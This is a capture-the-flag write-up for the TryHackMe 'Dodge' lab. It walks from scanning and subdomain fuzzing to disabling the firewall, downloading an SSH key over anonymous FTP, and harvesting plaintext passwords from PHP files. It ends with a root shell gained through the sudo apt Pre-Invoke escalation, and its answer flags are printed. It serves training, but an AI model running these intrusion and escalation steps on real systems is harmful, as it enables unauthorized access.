<p>July 14, 2025 - Day 434</p>
<h1>Dodge</h1>
<p><em>Test your pivoting and network evasion skills.</em><br>
https://tryhackme.com/room/dodge</p>

<br>

<img width="1887" height="380" alt="image" src="https://github.com/user-attachments/assets/903eb33b-3831-4e17-8c5f-3f7764d2fc79" />

<br>


<h3>nmap</h3>

<p>
- 22/ssh<br>
- 80/http<br>
- 443/https
</p>

```bash
:~# nmap -sC -sV -Pn -p- -T4 TargetIP
...
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: 403 Forbidden
443/tcp open  ssl/http Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=dodge.thm/organizationName=Dodge Company, Inc./stateOrProvinceName=Tokyo/countryName=JP
| Subject Alternative Name: DNS:dodge.thm, DNS:www.dodge.thm, DNS:blog.dodge.thm, DNS:dev.dodge.thm, DNS:touch-me-not.dodge.thm, DNS:netops-dev.dodge.thm, DNS:ball.dodge.thm
| Not valid before: 2023-06-29T11:46:51
|_Not valid after:  2123-06-05T11:46:51
| tls-alpn: 
|_  http/1.1
```

<h3>/etc/hosts</h3>

```bash
TargetIP   dodge.thm www.dodge.thm blog.dodge.thm dev.dodge.thm touch-me-not.dodge.thm netops-dev.dodge.thm ball.dodge.thm
```

```bash
:~# cat subdomains.txt
dodge.thm
www.dodge.thm
blog.dodge.thm
dev.dodge.thm
touch-me-not.dodge.thm
netops-dev.dodge.thm
ball.dodge.thm
```

```bash
:~# ffuf -u 'PROTO://10.10.228.233/' -H "Host: HOST" -w <(echo -e "http\nhttps"):PROTO -w subdomains.txt:HOST -fc 403
```

<img width="1080" height="556" alt="image" src="https://github.com/user-attachments/assets/b36b806b-06f9-4ae9-b008-84e9b4f26340" />

```bash
TargetIP   thm-lamp dodge.thm www.dodge.thm dev.dodge.thm netops-dev.dodge.thm
```

<h3>Web | dev.dodge.thm</h3>

<img width="1014" height="425" alt="image" src="https://github.com/user-attachments/assets/2f8bf921-9d43-4960-b745-f5cd58ab9969" />

<h3>Web | netops-dev.dodge.thm</h3>
<p>

- firewall.js<br>
- cf.js
</p>

<img width="1028" height="80" alt="image" src="https://github.com/user-attachments/assets/f4dee6c3-de1e-4897-96fc-331e7b08d2c3" />

<img width="1026" height="421" alt="image" src="https://github.com/user-attachments/assets/eaf16367-a19d-41e4-8254-d06817352c81" />

<h3>Web | netops-dev.dodge.thm/firewall.js</h3>

<p>

- firewall10110.php<br>
</p>

<img width="806" height="310" alt="image" src="https://github.com/user-attachments/assets/cd31b964-b78e-4049-92d3-0092532977f3" />

<h3>Web | netops-dev.dodge.thm/firewall10110.php</h3>

<img width="838" height="538" alt="image" src="https://github.com/user-attachments/assets/ba93e243-096a-4362-8eff-94ed5bcad868" />

<p>sudo ufw disable</p>

<img width="871" height="158" alt="image" src="https://github.com/user-attachments/assets/d46caa88-497b-4e57-8c64-98119ad7c194" />

<img width="845" height="564" alt="image" src="https://github.com/user-attachments/assets/071db146-5471-4354-a516-fc3c17528dcb" />

<p>reloaded</p>

<img width="883" height="263" alt="image" src="https://github.com/user-attachments/assets/5a65e868-2070-4958-8d49-61cc03b310ca" />

<h3>Web | netops-dev.dodge.thm/cf.js</h3>

<img width="849" height="102" alt="image" src="https://github.com/user-attachments/assets/fc32dfb1-5dc6-4fdc-8ad3-e40166771635" />

<p>https://deobfuscate.io/</p>

<img width="1251" height="422" alt="image" src="https://github.com/user-attachments/assets/75e10533-a3c2-4708-be57-5dd13c5355c0" />


```bash
!function (a, b) {
  "object" == typeof module && "object" == typeof module.exports ? module.exports = a.document ? b(a, true) : function (a) {
    if (!a.document) throw new Error("jQuery requires a window with a document");
    return b(a);
  } : b(a);
}("undefined" != typeof window ? window : this, function (a, b) {
  var c = [], d = c.slice, e = c.concat, f = c.push, g = c.indexOf, h = {}, i = h.toString, j = h.hasOwnProperty, k = {}, l = a.document, m = "2.1.3", n = function (a, b) {
    return new n.fn.init(a, b);
  }, o = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g, p = /^-ms-/, q = /-([\da-z])/gi;
  n.fn = n.prototype = {jquery: m, constructor: n, selector: "", length: 0, toArray: function () {
    return d.call(this);
  }, get: function (a) {
    return null != a ? 0 > a ? this[a + this.length] : this[a] : d.call(this);
  }, pushStack: function (a) {
    var b = n.merge(this.constructor(), a);
    return b.prevObject = this, b.context = this.context, b;
  }, each: function (a, b) {
    return n.each(this, a, b);
```


<h3>Web | www.dodge.thm</h3>

<img width="918" height="715" alt="image" src="https://github.com/user-attachments/assets/0548fa6a-0460-4390-a0ca-429ccd9851e9" />

<h3></h3>

```bash
:~# ftp dodge.thm
Connected to thm-lamp.
220 Welcome to Dodge FTP service
Name (dodge.thm:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    5 1003     1003         4096 Jun 29  2023 .
drwxr-xr-x    5 1003     1003         4096 Jun 29  2023 ..
-rwxr-xr-x    1 1003     1003           87 Jun 29  2023 .bash_history
-rwxr-xr-x    1 1003     1003          220 Feb 25  2020 .bash_logout
-rwxr-xr-x    1 1003     1003         3771 Feb 25  2020 .bashrc
drwxr-xr-x    2 1003     1003         4096 Jun 19  2023 .cache
drwxr-xr-x    3 1003     1003         4096 Jun 19  2023 .local
-rwxr-xr-x    1 1003     1003          807 Feb 25  2020 .profile
drwxr-xr-x    2 1003     1003         4096 Jun 22  2023 .ssh
-r--------    1 1003     1003           38 Jun 19  2023 user.txt
226 Directory send OK.
ftp> cd .ssh
250 Directory successfully changed.
ftp> mget *
mget authorized_keys? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for authorized_keys (573 bytes).
226 Transfer complete.
573 bytes received in 0.00 secs (5.9397 MB/s)
mget id_rsa? y
200 PORT command successful. Consider using PASV.
550 Failed to open file.
mget id_rsa_backup? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for id_rsa_backup (2610 bytes).
226 Transfer complete.
2610 bytes received in 0.00 secs (24.1659 MB/s)
ftp> cd ..
250 Directory successfully changed.
ftp> mget user.txt
mget user.txt? y
200 PORT command successful. Consider using PASV.
550 Failed to open file.
ftp> exit
221 Goodbye.
```


<h3>ssh</h3>

```bash
:~# chmod 6-- id_rsa_backup
:~# ssh -i id_rsa_backup challenger@thm-lamp
...
challenger@thm-lamp:~$ pwd
/home/challenger
challenger@thm-lamp:~$ ls
user.txt
challenger@thm-lamp:~$ cat user.txt
THM{0649b2285e507b38b10620e57f9c8610}
```

```bash
challenger@thm-lamp:~$ ls -lah
total 40K
drwxr-xr-x 5 challenger challenger 4.0K Jun 29  2023 .
drwxr-xr-x 6 root       root       4.0K Jun 19  2023 ..
-rwxr-xr-x 1 challenger challenger   87 Jun 29  2023 .bash_history
-rwxr-xr-x 1 challenger challenger  220 Feb 25  2020 .bash_logout
-rwxr-xr-x 1 challenger challenger 3.7K Feb 25  2020 .bashrc
drwxr-xr-x 2 challenger challenger 4.0K Jun 19  2023 .cache
drwxr-xr-x 3 challenger challenger 4.0K Jun 19  2023 .local
-rwxr-xr-x 1 challenger challenger  807 Feb 25  2020 .profile
drwxr-xr-x 2 challenger challenger 4.0K Jun 22  2023 .ssh
-r-------- 1 challenger challenger   38 Jun 19  2023 user.txt
```

```bash
challenger@thm-lamp:~$ cat .bash_history
history
exit
sudo -l
exit
exit
cat setup.php 
clear
exit
cat posts.php 
exit
exit
exit
```

```bash
challenger@thm-lamp:/home$ ls
challenger  cobra  tryhackme  ubuntu
```

```bash
challenger@thm-lamp:/home$ cd ubuntu
challenger@thm-lamp:/home/ubuntu$ ls
notes.txt
```

```bash
challenger@thm-lamp:/home/ubuntu$ cat notes.txt
ALTER USER 'root'@'localhost' IDENTIFIED BY 'password';
```

```bash
challenger@thm-lamp:/home/ubuntu$ find / -type f -name "setup.php" 2>/dev/null
/var/www/notes/api/setup.php
challenger@thm-lamp:/home/ubuntu$ find / -type f -name "posts.php" 2>/dev/null
/var/www/notes/api/posts.php
```

```bash
challenger@thm-lamp:/$ find / -type f -name "config.php" 2>/dev/null
/var/www/notes/api/config.php
```

```bash
challenger@thm-lamp:/var/www/notes/api$ ls
add_post.php  delete_post.php  index.php  logout.php  setup.php
config.php    edit_post.php    login.php  posts.php
```

<h3>posts.php</h3>

```bash
challenger@thm-lamp:/var/www/notes/api$ cat posts.php
<?php
session_start();
require 'config.php';
header('Content-Type: application/json');
if (isset($_SESSION['username'])) {
    $posts = 'W3sidGl0bGUiOiJUby1kbyBsaXN0IiwiY29udGVudCI6IkRlZmluZSBhcHAgcmVxdWlyZW1lbnRzOjxicj4gMS4gRGVzaWduIHVzZXIgaW50ZXJmYWNlLiA8YnI+IDIuIFNldCB1cCBkZXZlbG9wbWVudCBlbnZpcm9ubWVudC4gPGJyPiAzLiBJbXBsZW1lbnQgYmFzaWMgZnVuY3Rpb25hbGl0eS4ifSx7InRpdGxlIjoiTXkgU1NIIGxvZ2luIiwiY29udGVudCI6ImNvYnJhIFwvIG16NCVvN0JHdW0jVFR1In1d';
    echo base64_decode($posts);

} else {
  echo json_encode(array('error' => 'Not logged in'));
}
?>
```

<p><code>cobra</code>  :  <code>mz4%o7BGum#TTu</code></p>

<img width="1342" height="435" alt="image" src="https://github.com/user-attachments/assets/744be984-9e13-40ce-b707-0463768d9a5b" />


<h3>setup.php</h3>

```bash
challenger@thm-lamp:/var/www/notes/api$ cat setup.php
cat: setup.php: Permission denied
```


<h3>config.php</h3>

```bash
challenger@thm-lamp:/var/www/notes/api$ cat config.php
<?php

#$host = 'localhost';
#$db   = 'dodgey';
#$user = 'root';
#$pass = '';
#$mysqli = new mysqli($host, $user, $pass, $db);

#if ($mysqli->connect_error) {
#    die('Connect Error (' . $mysqli->connect_errno . ') ' . $mysqli->connect_error);
#}
?>
```

<h3>login.php</h3>

```bash
challenger@thm-lamp:/var/www/notes/api$ cat login.php
<?php
session_start();
require 'config.php';
header('Content-Type: application/json');
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents('php://input'), true);
    $username = $data['username'];
    $password = $data['password'];

    if($username === "gabriela" && $password === "^5hf5w&CAt9sPr@"){    
        $_SESSION['username'] = $username;
        $_SESSION['role'] = 'admin';
        echo json_encode(['message' => 'Login successful.', 'role' => $_SESSION['role']]);
    } else {
        echo json_encode(array('error' => 'Invalid username or password'));
    }
} else {
  echo json_encode(array('error' => 'Invalid request method'));
}
?>
```

<h3>cobra</h3>

```bash
challenger@thm-lamp:/var/www/notes/api$ su cobra
Password: 
cobra@thm-lamp:/var/www/notes/api$
```

<h3>sudo -l</h3>

```bash
cobra@thm-lamp:~$ sudo -l
Matching Defaults entries for cobra on thm-lamp:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cobra may run the following commands on thm-lamp:
    (ALL) NOPASSWD: /usr/bin/apt
```

<h3>GTFobins</h3>
<p>https://gtfobins.github.io/gtfobins/apt/#sudo</p>

<img width="1262" height="467" alt="image" src="https://github.com/user-attachments/assets/d3173a4a-ee0c-4cd7-9d39-84634e7624dd" />


<h3>root</h3>

```bash
cobra@thm-lamp:~$ sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
THM{7b88ac4f52cd8723a8d0c632c2d930ba}
```

<br>
<br>

<img width="1908" height="883" alt="image" src="https://github.com/user-attachments/assets/63800046-f783-41ed-b7c7-ba6e062520cb" />

<img width="1903" height="906" alt="image" src="https://github.com/user-attachments/assets/5d1bcda6-8b6b-4e5a-b5e3-c218a9237d66" />


<br>
<br>

<h1 align="center">My TryHackMe Journey</h1>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| July 14, 2025     | 433      |     159ᵗʰ    |      5ᵗʰ     |    189ᵗʰ    |     7ᵗʰ    |  114,795 |    856    |     64    |

</div>

<img width="1901" height="900" alt="image" src="https://github.com/user-attachments/assets/c98b97be-e35d-40b0-83ab-93b6a5d9a97b" />

<img width="1895" height="891" alt="image" src="https://github.com/user-attachments/assets/2f81d532-978c-488c-93e4-9b9af30f9944" />

<img width="1900" height="892" alt="image" src="https://github.com/user-attachments/assets/5e844595-094a-471b-ad1f-7352f4d8b29b" />

<img width="1895" height="895" alt="image" src="https://github.com/user-attachments/assets/193a0105-9821-489e-9fae-cee1b0ba6a9d" />
